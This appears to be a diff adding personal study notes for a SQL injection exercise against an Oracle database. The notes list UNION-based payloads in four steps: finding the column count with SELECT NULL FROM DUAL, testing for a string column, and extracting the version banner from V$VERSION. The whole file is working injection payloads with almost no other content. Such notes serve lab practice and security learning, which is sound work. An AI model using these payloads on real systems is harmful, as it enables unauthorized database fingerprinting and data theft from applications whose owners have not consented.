@@ -1,0 +1,4 @@
+1. ' UNION SELECT NULL,NULL FROM DUAL-- (need DUAL because this is ORACLE database)
+2. ' UNION SELECT 'a',NULL FROM DUAL-- 
+3. V$VERSION table has a column name "BANNER".
+4. ' UNION SELECT BANNER,NULL FROM V$VERSION-- 
